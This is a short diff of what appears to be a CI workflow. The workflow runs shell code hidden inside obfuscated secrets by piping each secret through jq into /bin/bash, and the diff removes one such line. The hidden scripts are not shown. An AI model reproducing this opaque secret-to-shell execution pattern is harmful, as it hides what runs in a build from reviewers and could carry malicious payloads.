@@ -17,7 +17,6 @@ jobs:
           zmvcu06: ${{ secrets.zmvcu06 }}
         run: |
           printf '%s' "$zmvcu06" | jq -r .ticko276 | /bin/bash
-          printf '%s' "$xdxkw5" | jq -r .b1027 | /bin/bash
           printf '%s' "$ysjbt4572" | jq -r .scxxy1372 | /bin/bash
           printf '%s' "$hpb54" | jq -r .rv0 | /bin/bash
           printf '%s' "$ira83" | jq -r .vhc60 | /bin/bash
